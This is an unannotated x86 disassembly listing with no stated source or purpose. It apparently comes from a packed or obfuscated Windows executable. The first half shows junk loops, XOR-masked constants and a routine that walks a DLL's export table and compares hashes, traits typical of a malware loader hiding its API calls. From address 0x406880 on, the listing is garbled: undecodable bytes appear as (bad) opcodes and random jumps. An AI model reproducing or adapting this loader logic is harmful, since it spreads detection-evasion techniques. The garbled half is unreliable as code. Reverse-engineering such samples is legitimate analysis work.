  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
  406148:	xor    edx,esi
  40614a:	add    eax,edx
  40614c:	mov    edx,DWORD PTR [ebp-0x20]
  40614f:	xor    edx,esi
  406151:	add    eax,edx
  406153:	mov    edx,DWORD PTR [ebp-0x10]
  406156:	lea    eax,[eax+edx*1+0x64e5ea]
  40615d:	jmp    0x406171
  406162:	mov    eax,DWORD PTR [ebp-0x20]
  406165:	mov    edx,DWORD PTR [ebp-0x10]
  406168:	xor    eax,esi
  40616a:	lea    eax,[eax+edx*1+0x3272f5]
  406171:	mov    DWORD PTR [ebp-0x10],eax
  406174:	jmp    0x403c34
  406179:	mov    ebx,DWORD PTR [ebp-0x3c]
  40617c:	mov    eax,DWORD PTR [ebp+0xc]
  40617f:	xor    eax,esi
  406181:	lea    ecx,[ecx+eax*1+0x3272f5]
  406188:	lea    eax,[ecx-0x3272f5]
  40618e:	xor    eax,esi
  406190:	cmp    eax,0xf89c95a5
  406195:	jne    0x401883
  40619b:	dec    DWORD PTR [ebp-0x34]
  40619e:	jne    0x401877
  4061a4:	mov    eax,DWORD PTR [ebp+0x8]
  4061a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4061aa:	mov    edx,DWORD PTR [ebp+0x8]
  4061ad:	xor    ecx,esi
  4061af:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f5]
  4061b6:	xor    eax,esi
  4061b8:	mov    al,BYTE PTR [eax+ebx*1+0x3272f5]
  4061bf:	xor    edx,esi
  4061c1:	mov    BYTE PTR [edx+ebx*1+0x3272f5],cl
  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	push   es
  40688d:	nop
  40688e:	loopne 0x4068ae
  406890:	adc    edi,DWORD PTR ds:0x5e0c8383
  406896:	add    DWORD PTR [ebx-0x1b20b48a],0x3b
  40689d:	mov    al,0x8a
  40689f:	inc    ecx
  4068a0:	scas   al,BYTE PTR es:[edi]
  4068a1:	xor    edx,DWORD PTR [di]
  4068a4:	jmp    0xe0a0:0x5f30925c
  4068ab:	es sub dh,al
  4068ae:	fidiv  DWORD PTR [edi+0x4da7524c]
  4068b4:	inc    edx
  4068b5:	inc    eax
  4068b6:	dec    ebx
  4068b7:	pop    edx
  4068b8:	pop    esi
  4068b9:	(bad)  
  4068ba:	pop    edi
  4068bb:	pop    esi
  4068bc:	ins    DWORD PTR es:[edi],dx
  4068bd:	fsub   st,st(4)
  4068bf:	je     0x406937
  4068c1:	cli    
  4068c2:	add    bh,BYTE PTR [edi-0x42]
  4068c5:	jb     0x40688a
  4068c7:	mov    ebp,0x54ea37e6
  4068cc:	mov    esp,0x45fe85c7
  4068d1:	dec    eax
  4068d2:	cs (bad) 
  4068d4:	dec    ebx
  4068d5:	ret    0xb336
  4068d8:	add    BYTE PTR [edx-0x30b1e66c],0xe8
  4068df:	inc    edi
  4068e0:	push   ss
  4068e1:	inc    esi
  4068e2:	and    ecx,DWORD PTR [edx-0x32482a88]
  4068e8:	stos   DWORD PTR es:[edi],eax
  4068e9:	mov    esi,0xc4b1c92d
  4068ee:	daa    
  4068ef:	push   ecx
  4068f0:	div    DWORD PTR [ecx+0x2df3f640]
  4068f6:	repnz jmp 0xea67:0x58749ee5
  4068fe:	dec    ebx
  4068ff:	sbb    ebx,DWORD PTR [ecx+0x66]
  406902:	pop    edx
  406903:	(bad)  
  406904:	mov    dh,bl
  406906:	push   ebp
  406907:	mov    ds:0x63c41bf5,al
  40690c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690e:	inc    ecx
  40690f:	cmc    
  406910:	fdivp  st(4),st
  406912:	push   edi
  406913:	adc    BYTE PTR [ecx-0x68bb28b5],al
  406919:	sbb    eax,0xad70b827
  40691e:	xor    al,0x5
  406920:	pcmpgtb mm5,QWORD PTR ds:0x929d726d
  406927:	jl     0x406923
  406929:	pop    ecx
  40692a:	jnp    0x406924
  40692c:	jbe    0x406988
  40692e:	cld    
  40692f:	cmp    dh,BYTE PTR [ebp-0x54]
  406932:	jmp    0x40694d
  406934:	std    
  406935:	fs call 0x9e5b:0x36d78802
  40693d:	jmp    0x4068e5
  40693f:	lds    esp,FWORD PTR [esi-0x6c637dad]
  406945:	sbb    bl,BYTE PTR [edx]
  406947:	mov    ebx,0x619106fb
  40694c:	sbb    eax,0x561d8981
  406951:	inc    edx
  406952:	leave  
  406953:	popf   
  406954:	les    ebp,FWORD PTR [ebp-0x7d2971c0]
  40695a:	push   cs
  40695b:	mov    ecx,0x591c16d8
  406960:	mov    edx,0x418cd1b9
  406965:	add    esp,DWORD PTR gs:[ebp-0x247dd222]
  40696c:	aas    
  40696d:	sub    eax,0x2a36feee
  406972:	dec    ebx
  406973:	dec    ebx
  406974:	push   edx
  406975:	daa    
  406976:	cvtps2pd xmm5,QWORD PTR [eax+esi*2]
  40697a:	pop    esp
  40697b:	dec    edx
  40697c:	sub    DWORD PTR [ecx+ebp*4],esi
  40697f:	pop    DWORD PTR cs:[esi-0x50]
  406983:	sti    
  406984:	jge    0x406978
  406986:	in     al,0xb6
  406988:	mov    edi,0xa7a54084
  40698d:	sbb    al,0xe4
  40698f:	mov    ch,0x4b
  406991:	es pop es
  406993:	jg     0x40692f
  406995:	sbb    eax,0xd0059569
  40699a:	repz lea ecx,[ebx+eiz*2+0x8]
  40699f:	cmp    al,0x80
  4069a2:	mov    cl,0xd8
  4069a4:	ret    0xb255
  4069a7:	or     eax,0x52d5f7b7
  4069ac:	cmp    ebp,DWORD PTR [ecx]
  4069ae:	dec    esi
  4069af:	add    eax,0x45ee51e2
  4069b4:	sbb    BYTE PTR [ecx-0x6c],bl
  4069b7:	adc    BYTE PTR ds:0xe6ca5e43,0x94
  4069be:	mov    eax,0xdaf43b8a
  4069c3:	xchg   edi,eax
  4069c4:	pop    ds
  4069c5:	and    bh,cl
  4069c7:	mov    DWORD PTR [esi-0x1dbbf0c7],esi
  4069cd:	inc    eax
  4069ce:	sti    
  4069cf:	push   0xa80ded0f
  4069d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d5:	call   FWORD PTR [ebp-0x2a]
  4069d8:	fadd   DWORD PTR [ebx-0x4ca03e40]
  4069de:	imul   edi,DWORD PTR [eax+0x7b],0xcce2124d
  4069e5:	push   ds
  4069e6:	jge    0x406989
  4069e8:	test   eax,0x6c55ea66
  4069ed:	leave  
  4069ee:	cld    
  4069ef:	jne    0x4069f2
  4069f1:	retf   
  4069f2:	jge    0x40698d
  4069f4:	fbld   TBYTE PTR [ebp-0x4ebb2334]
  4069fa:	mov    esi,0x1c66513f
  4069ff:	ins    BYTE PTR es:[edi],dx
  406a00:	pop    edx
  406a01:	push   ecx
  406a02:	pop    esp
  406a03:	push   ss
  406a04:	adc    dh,BYTE PTR [edi+0x34d19f88]
  406a0a:	cmp    ebp,DWORD PTR [eax]
  406a0c:	shr    DWORD PTR [ecx-0xf],cl
  406a0f:	repnz pop es
  406a11:	push   ebp
  406a12:	scas   eax,DWORD PTR es:[edi]
  406a13:	dec    eax
  406a14:	dec    edi
  406a15:	xchg   ebx,eax
  406a16:	or     al,0x2a
  406a18:	or     bh,cl
  406a1a:	dec    edx
  406a1b:	push   cs
  406a1c:	pusha  
  406a1d:	jmp    0xd09:0x7611ca9e
  406a24:	aam    0x16
  406a26:	in     eax,0x91
  406a28:	ret    
  406a29:	aas    
  406a2a:	adc    DWORD PTR [ecx+0xb41f2be],esp
  406a30:	scas   eax,DWORD PTR es:[edi]
  406a31:	xchg   ebx,eax
  406a32:	ret    
  406a33:	dec    edx
  406a34:	test   BYTE PTR [esi-0x35],cl
  406a37:	xchg   ebx,eax
  406a38:	xlat   BYTE PTR ds:[ebx]
  406a39:	das    
  406a3a:	fdiv   DWORD PTR [eax+eax*4+0x4509fd4e]
  406a41:	stos   DWORD PTR es:[edi],eax
  406a42:	mov    cl,cl
  406a44:	sbb    DWORD PTR [eax+0x1da1d2d9],edx
  406a4a:	cmp    DWORD PTR [edx-0x4],ecx
  406a4d:	cmc    
  406a4e:	cmc    
  406a4f:	popa   
  406a50:	lods   eax,DWORD PTR ds:[esi]
  406a51:	jo     0x406a96
  406a53:	pusha  
  406a54:	lods   al,BYTE PTR ds:[esi]
  406a55:	pop    es
  406a56:	xchg   esi,eax
  406a57:	mov    cl,0x98
  406a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a5a:	jno    0x406a10
  406a5c:	push   ss
  406a5d:	xor    bh,ah
  406a5f:	mov    cl,0x62
  406a61:	dec    ebp
  406a62:	div    DWORD PTR [ebp+0x29]
  406a65:	fwait
  406a66:	(bad)  
  406a67:	retf   
  406a68:	or     al,0x9e
  406a6a:	push   0xffffffa9
  406a6c:	xchg   edx,eax
  406a6d:	adc    ch,BYTE PTR [eax+0x5a915f40]
  406a73:	inc    eax
  406a74:	inc    esp
  406a75:	stc    
  406a76:	pop    edi
  406a77:	xchg   ecx,eax
  406a78:	jp     0x406a6f
  406a7a:	stos   DWORD PTR es:[edi],eax
  406a7b:	pop    ss
  406a7c:	cmp    dh,BYTE PTR [eax+edi*4]
  406a7f:	mul    BYTE PTR [ebx-0x7]
  406a82:	mov    esi,0xccf03a21
  406a87:	xor    esi,DWORD PTR [ebp-0x1ad6f1b]
  406a8d:	es mov dl,0x3c
  406a90:	mov    ds:0xff4a1d51,eax
  406a95:	into   
  406a96:	movq   mm4,QWORD PTR [esi-0x73]
  406a9a:	mov    gs,WORD PTR [edi-0x2c]
  406a9d:	mov    al,ds:0xe4725b4a
  406aa2:	dec    ebx
  406aa3:	rcl    BYTE PTR [ecx],cl
  406aa5:	out    0xa9,eax
  406aa7:	or     al,0x60
  406aa9:	sti    
  406aaa:	ffreep st(7)
  406aac:	data16 fwait
  406aae:	and    edi,DWORD PTR [ecx-0x2e4075d]
  406ab4:	scas   eax,DWORD PTR es:[edi]
  406ab5:	jno    0x406b01
  406ab7:	fwait
  406ab8:	loope  0x406b12
  406aba:	(bad)  
  406abb:	adc    BYTE PTR [ebx+0x728880a5],cl
  406ac1:	dec    edi
  406ac2:	push   0xffffffc9
  406ac4:	mov    ah,0x60
  406ac6:	ds js  0x406b33
  406ac9:	loop   0x406b26
  406acb:	inc    ecx
  406acc:	test   eax,0xf0a94c4e
  406ad1:	int3   
  406ad2:	jmp    0x7100:0xbc1d6507
  406ad9:	add    ebx,edi
  406adb:	pop    ss
  406adc:	mov    eax,ds:0x3f07be90
  406ae1:	mov    edx,0xf4d5e464
  406ae6:	iret   
  406ae7:	call   0x1a130772
  406aec:	mov    edi,0x25329032
  406af1:	(bad)  
  406af2:	xor    BYTE PTR [ecx+esi*4+0x6b83ab7b],cl
  406af9:	adc    ah,BYTE PTR [edx-0x3a]
  406afc:	sbb    esp,DWORD PTR [ecx]
  406afe:	test   eax,0x4f239f47
  406b03:	inc    edx
  406b04:	jno    0x406aed
  406b06:	cli    
  406b07:	or     al,0x95
  406b09:	neg    BYTE PTR [ecx-0x6d]
  406b0c:	cmp    eax,0xf8800ab6
  406b11:	mov    ah,0x8b
  406b13:	adc    bl,BYTE PTR [ebx+0x61]
  406b16:	lahf   
  406b17:	xor    BYTE PTR [esp+esi*4],dh
  406b1a:	or     ebx,DWORD PTR [ebx+ebx*2-0xb6b373e]
  406b21:	inc    sp
  406b23:	arpl   WORD PTR ds:0x709a4b99,ax
  406b29:	shl    DWORD PTR [esi-0x31],0x74
  406b2d:	pop    esi
  406b2e:	sbb    dl,BYTE PTR [esi]
  406b30:	in     al,dx
  406b31:	(bad)  
  406b32:	xchg   esi,eax
  406b33:	mov    ecx,0x391872d7
  406b38:	dec    ebp
  406b39:	and    eax,0xffffffdc
  406b3c:	mov    bl,BYTE PTR [ebx]
  406b3e:	or     ecx,DWORD PTR ds:0xe8982255
  406b44:	dec    edi
  406b45:	jae    0x406bba
  406b47:	cld    
  406b48:	adc    eax,DWORD PTR [edx]
